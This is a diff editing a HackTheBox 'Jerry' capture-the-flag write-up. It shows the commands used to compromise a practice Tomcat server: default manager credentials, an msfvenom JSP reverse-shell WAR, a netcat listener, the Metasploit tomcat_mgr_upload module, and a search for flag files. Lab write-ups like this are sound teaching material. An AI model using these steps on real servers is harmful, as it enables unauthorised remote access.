@@ -1,4 +1,4 @@
-# hackthebox jerry writeup
+# jerry
 
 [link to the box](https://app.hackthebox.com/machines/Jerry)
 
@@ -12,9 +12,7 @@
 
 # scanning
 
-scan the target for open ports:
-
-this box has a static ip of 10.10.10.95
+as with anything, we first scan the target for open ports
 
 ```bash
 $ nmap -Pn -sV 10.10.10.95
@@ -44,7 +42,7 @@ which happens to highlight a default username and password for tomcat, `tomcat:s
 
 and we have access to manager now! what a dumb way to get to it. from manager, we are able to upload our own `.WAR` files to the server.
 
-upon further research, these can be executed and therefore used to create a reverse shell! lets explore the 3 methods we have at our disposal for this.
+upon further research, these are executed on the host machine and therefore can be used to create a reverse shell! lets explore 2 methods we have at our disposal for this.
 
 # exploiting
 
@@ -55,24 +53,22 @@ an easy way to get a reverse shell would be to use `msfvenom` to create a payloa
 use `msfvenom` to create payload using the command:
 
 ```bash
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your local ip> LPORT=<any sane port> -f war > jsp-shell-reverse-tcp.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<local ip> LPORT=<unused port> -f war > jsp-shell-reverse-tcp.war
 ```
-
-you can get `<my local ip>` on most linux distributions by running `ip addr list | grep "tun"` and finding the local ip next to `inet` (ignoring subnet mask). you need the local ip since the vpn into hackthebox puts you on the machine's local network.
 
 once the payload has been created, start netcat to recieve the reverse shell.
 
 ```bash
-nc -lvp <previously chosen sane port>
+nc -lvp <same unused port>
 ```
 
-upload the payload through the manager webportal, then click on its file in the 'applications' table.
+upload the payload through the manager webportal, then click on its file in the 'applications' table to execute it.
 
 congrats! you now have a reverse shell.
 
 ## msfconsole
 
-the simplest and most abstract method would be to use `exploit/multi/http/tomcat_mgr_upload` in `msfconsole` to create our reverse shell. here is a short walkthrough:
+a simpler and automatic method would be to use `exploit/multi/http/tomcat_mgr_upload` in `msfconsole` to create our reverse shell. here is a short walkthrough:
 
 ```bash
 $ msfconsole
@@ -82,12 +78,10 @@ msf6 payload(...) > set RHOSTS 10.10.10.95
 msf6 payload(...) > set RPORT 8080
 msf6 payload(...) > set HttpUsername tomcat
 msf6 payload(...) > set HttpPassword s3cret
-msf6 payload(...) > set LHOST <my local ip>
-msf6 payload(...) > set LPORT <any sane port>
+msf6 payload(...) > set LHOST <local ip>
+msf6 payload(...) > set LPORT <unused port>
 msf6 payload(...) > exploit
 ```
-
-you can get `<my local ip>` on most linux distributions by running `ip addr list | grep "tun"` and finding the local ip next to `inet` (ignoring subnet mask). you need the local ip since the vpn into hackthebox puts you on the machine's local network.
 
 congrats! you now have a reverse shell on the target machine.
 
@@ -95,15 +89,13 @@ congrats! you now have a reverse shell on the target machine.
 
 since we are now properly in a windows shell, we can start looking around for flags.
 
-(if you are in an meterpreter shell, run `shell` to open cmd)
+(if you are in an meterpreter shell, run `shell` to open cmd.exe)
 
 first, run `whoami` to see what permissions we have.
 
 ![we are root](img/whoami.png)
 
 oh. we are administraror. no escalation needs to occur.
-
-now lets search for the flags then!
 
 search the system for flag files:
 
@@ -113,7 +105,7 @@ where /r c: *flag* # nothing
 where /r c: *.txt  # something!
 ```
 
-using `where` in windows, we are able to find `c:\Users\Administrator\Desktop\flags\"2 for the price of 1.txt"`!
+using `where` in windows, we are able to find `c:\Users\Administrator\Desktop\flags\"2 for the price of 1.txt"`
 
 use `type` to print the contents of the file
 
